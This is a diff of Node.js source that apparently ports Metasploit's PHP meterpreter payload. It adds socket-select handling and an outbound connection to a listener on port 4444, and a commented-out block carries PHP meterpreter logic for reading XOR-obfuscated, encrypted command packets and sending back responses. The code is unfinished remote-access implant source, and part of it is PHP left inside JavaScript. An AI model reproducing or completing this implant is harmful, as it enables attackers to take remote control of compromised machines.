@@ -90,7 +90,7 @@ function run_cmd(cmd, args, callBack ) {
 */
 
 
-
+// Select function similar to PHP meterpreter 
 function select( va, tv_sec = 0, tv_usec = 0) {
 		
 streams_r = [];
@@ -99,17 +99,12 @@ streams_e = [];
 sockets_r = [];
 sockets_w = [];
 sockets_e = [];
-//va.a = "hello"; 
-//va.b="asd";
-//va.c="dsa";
-//va.d="dsa";
-//console.log(va); 
   
 if (va.a){
   va.a.forEach(function(entry) {
     if (entry.constructor.name == 'Socket') {
 	  sockets_r[0] = entry;
-	  my_print("It's a socket !");
+	  //my_print("It's a socket !");
     }			
   });
   n_sockets = sockets_r.length
@@ -168,7 +163,7 @@ function connect(ipaddr, port) {
   proto = 'tcp';
   my_print("("+proto+"://"+ipaddr+":"+port+")");
   var sock = net.connect(port, ipaddr, function() {
-    console.log("conn");
+    
   });
   sock.on("error", function(error) {
     process.exit()
@@ -181,11 +176,11 @@ if (typeof msgsock == "undefined") {
   var ipaddr = '127.0.0.1';
   var port = '4444';
   my_print("Don't have a msgsock, trying to connect ("+ipaddr+","+ port+")");
-  socks = connect(ipaddr,port);
+  msgsock = connect(ipaddr,port);
 }
 
 
-add_reader(socks);
+add_reader(msgsock);
 
 r = readers;
 w = null;
@@ -194,14 +189,29 @@ t = 1;
 
 var combine = {a:r,b:w,c:e,d:t};
 
-select(combine) 
-
-//console.log("\n\n[+] GETTING INSIDE THE BIG WHILE LOOP .. \n\n");
 /*
 while (false !== (cnt = select(combine))) {
-   console.log(r);
-	break;
+  read_failed = false;
+  for (i = 0; i < cnt; i++) {
+    ready = r[i];
+    if (ready == msgsock) {
+      packet = read(msgsock, 32);
+      if (false == $packet) {
+        my_print("Read failed on main socket, bailing");
+        break 2;
+      }
+      $xor = substr($packet, 0, 4);
+      $header = xor_bytes($xor, substr($packet, 4, 28));
+      $len_array = unpack("Nlen", substr($header, 20, 4));
+      $len = $len_array['len'] + 32 - 8;
+      while (strlen($packet) < $len) {
+        $packet .= read($msgsock, $len - strlen($packet));
+      }
+      $response = create_response(decrypt_packet(xor_bytes($xor, $packet)));
+      write_tlv_to_socket($msgsock, $response);
+    }
+  }
+ 
 }
-
-*/
+ */
 
